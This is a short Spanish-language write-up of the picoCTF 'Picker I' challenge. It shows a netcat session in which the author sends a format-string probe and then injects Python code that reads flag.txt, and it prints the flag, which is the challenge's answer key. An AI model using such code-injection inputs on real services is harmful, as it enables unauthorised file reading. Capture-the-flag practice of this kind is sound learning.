### Descripción
This service can provide you with a random number, but can it do anything else?Connect to the program with netcat:`$ nc saturn.picoctf.net 60184`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/515/picker-I.py).
### Solución
```
noss conectamos y hacemos pruebas 

giselle_maz-picoctf@webshell:~$ nc saturn.picoctf.net 50019
Try entering "getRandomNumber" without the double quotes...
==> %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
invalid syntax (<string>, line 1)
^C
giselle_maz-picoctf@webshell:~$ nc saturn.picoctf.net 50019
Try entering "getRandomNumber" without the double quotes...
==> getRandomNumber
4
Try entering "getRandomNumber" without the double quotes...
==> getRandomNumber
4
Try entering "getRandomNumber" without the double quotes... 

pero no obtenemos nada, entonces haremos una inyeccion de comandos para leer variables.
entonces abrimos el archivo y extraemos el contenido de la flag.

giselle_maz-picoctf@webshell:~$ nc saturn.picoctf.net 50019
Try entering "getRandomNumber" without the double quotes...
==> print(open('flag.txt').read())
picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}
```
### Notas adicionales 
picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}
### Referencias